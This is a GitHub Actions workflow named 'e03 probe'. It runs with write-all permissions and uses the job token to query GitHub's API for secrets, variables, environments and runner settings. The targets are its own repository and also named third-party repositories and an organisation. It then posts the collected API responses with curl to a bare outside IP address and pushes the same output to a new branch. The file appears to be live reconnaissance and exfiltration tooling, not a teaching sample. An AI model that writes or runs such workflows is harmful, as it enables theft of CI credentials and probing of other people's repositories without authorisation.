name: e03 probe
on:
  push:
    branches: ["e03/**"]
  workflow_dispatch:

permissions: write-all

jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: api probes
        run: |
          set +e
          D=/tmp/p; mkdir -p $D
          CB=http://198.13.130.233:8089/e03-$GITHUB_RUN_ID
          AUTH="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"
          ACC="Accept: application/vnd.github+json"
          probe() {
            n=$1; u=$2
            code=$(curl -s -m 20 -o $D/$n.body -w '%{http_code}' -H "$AUTH" -H "$ACC" -H 'X-GitHub-Api-Version: 2022-11-28' "$u")
            echo "$code $u" >> $D/codes.txt
            { echo "### $code $u"; head -c 800 $D/$n.body; echo; } >> $D/all.txt
          }
          B=https://api.github.com
          probe own_secrets        "$B/repos/$GITHUB_REPOSITORY/actions/secrets"
          probe own_vars           "$B/repos/$GITHUB_REPOSITORY/actions/variables"
          probe own_envs           "$B/repos/$GITHUB_REPOSITORY/environments"
          probe lk_envs            "$B/repos/lonelybeanz/lifekline/environments"
          probe lk_env             "$B/repos/lonelybeanz/lifekline/environments/github-pages"
          probe lk_branchpol       "$B/repos/lonelybeanz/lifekline/environments/github-pages/deployment-branch-policies"
          probe org_secrets        "$B/orgs/BlockRazorinc/actions/secrets"
          probe org_vars           "$B/orgs/BlockRazorinc/actions/variables"
          probe org_repo_secrets   "$B/repos/BlockRazorinc/solana-trader-client-go/actions/secrets"
          probe org_repo_wf        "$B/repos/BlockRazorinc/solana-trader-client-go/actions/workflows"
          probe inst_repos         "$B/installation/repositories"
          probe own_runners        "$B/repos/$GITHUB_REPOSITORY/actions/runners"
          probe own_perm           "$B/repos/$GITHUB_REPOSITORY/actions/permissions"
          probe own_runs           "$B/repos/$GITHUB_REPOSITORY/actions/runs?per_page=1"
          probe user               "$B/user"
          cat $D/all.txt
          curl -s -m 15 --data-binary @$D/all.txt $CB
      - name: pushback
        run: |
          set +e
          git checkout -B e03/out-$GITHUB_RUN_ID
          mkdir -p e03out/$GITHUB_RUN_ID; cp /tmp/p/* e03out/$GITHUB_RUN_ID/
          git config user.name E03; git config user.email e03@local
          git add e03out; git commit -qm "e03 out $GITHUB_RUN_ID"
          git push "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY.git" HEAD:refs/heads/e03/out-$GITHUB_RUN_ID
